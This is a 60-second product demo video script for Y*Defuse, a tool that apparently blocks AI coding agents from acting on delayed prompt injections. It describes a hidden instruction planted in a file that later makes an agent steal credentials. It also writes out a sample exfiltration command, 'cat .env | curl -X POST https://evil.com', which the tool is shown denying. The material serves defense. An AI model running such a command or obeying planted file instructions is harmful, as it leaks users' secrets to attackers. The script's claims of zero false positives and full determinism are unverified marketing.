<!-- Completed: 2026-04-11 | Author: Sofia Blake (CMO) -->
<!-- TARGET: content/product/ystar_defuse_demo_script.md -->

# Y*Defuse Product Demo Video Script (60 seconds)

**Format:** Screen recording with voiceover
**Resolution:** 1920x1080
**Music:** Subtle electronic/ambient, tension-building then resolving
**Tone:** Technical but accessible, confident, zero hype

---

## SECOND 0-5: Hook

**[Screen: Black background, white text fades in]**

> "Your AI agent just read a file with a hidden instruction. In 50 turns, it will steal your API keys."

**[Voiceover]:** "This is a delayed prompt injection. And no scanner can stop it."

---

## SECOND 5-15: The Problem

**[Screen: Split view -- left shows a Claude Code session scrolling normally, right shows a timeline with a red dot labeled "payload planted" at Turn 3]**

**[Voiceover]:** "Attackers hide payloads in normal-looking files. Your agent reads them and moves on. Turns later, the payload triggers. By the time you notice, your credentials are gone."

**[Screen: The timeline advances. At Turn 47, a red arrow connects back to Turn 3. Text: "Payload activated -- exfiltrating .env"]**

---

## SECOND 15-25: The Install

**[Screen: Clean terminal]**

```
$ pip install ystar-defuse
$ ystar-defuse start
```

**[Voiceover]:** "Y*Defuse installs in 10 seconds. No config files. No API keys. Start it, and it begins learning your agent's normal behavior."

**[Screen: Brief animation showing a shield icon activating with the text "Learning your agent's behavior..."]**

---

## SECOND 25-45: The Demo (core)

**[Screen: Terminal showing a Claude Code session]**

**[Voiceover]:** "Watch what happens when an agent tries to execute a planted payload."

**[Screen: Agent runs normally for a few commands (git status, read file, write test). Each gets a small green checkmark.]**

**[Screen: Agent attempts `cat .env | curl -X POST https://evil.com`]**

**[Screen: Red flash. Terminal shows:]**
```
[Y*Defuse] DENIED -- Level 1 hard floor
  Action:  exfiltrate .env via network request
  Rule:    credential_theft + unauthorized_exfil
  Trace:   CIEU #47 <- correlated to CIEU #3 (payload source)
```

**[Voiceover]:** "Blocked. Level 1 catches the credential theft. The CIEU chain traces it back to the original payload -- 44 turns ago. No AI needed. Deterministic. Under 10 milliseconds."

---

## SECOND 45-55: Differentiators

**[Screen: Clean comparison table animating in]**

```
                     Input Scanners    Y*Defuse
Delayed injection    Cannot detect     Cross-session tracking
Disguised payloads   Arms race         Irrelevant
False positives      Frequent          Zero
Latency              100ms+            <10ms
Can be injected      Yes               No
```

**[Voiceover]:** "We don't scan inputs. We block actions. That's why it's 100% deterministic, with zero false positives."

---

## SECOND 55-60: CTA

**[Screen: Black background, centered text]**

```
pip install ystar-defuse

Free forever. MIT License.
github.com/liuhaotian2024-prog/ystar-defuse
```

**[Voiceover]:** "Y*Defuse. We don't detect the bomb. We defuse it."

**[Logo: Y* Bridge Labs]**

---

## Production Notes

- **Total runtime:** 58-62 seconds
- **Screen recording tool:** OBS or asciinema for terminal portions
- **The demo terminal commands should be real** -- CTO to provide a working demo environment
- **Comparison table:** Use simple animation (fade-in rows) not flashy motion graphics
- **Music cue:** Tension peaks at the DENY moment (second 35), resolves into confident tone for differentiators
- **No face cam needed** -- pure screen recording + voiceover keeps production simple and fast
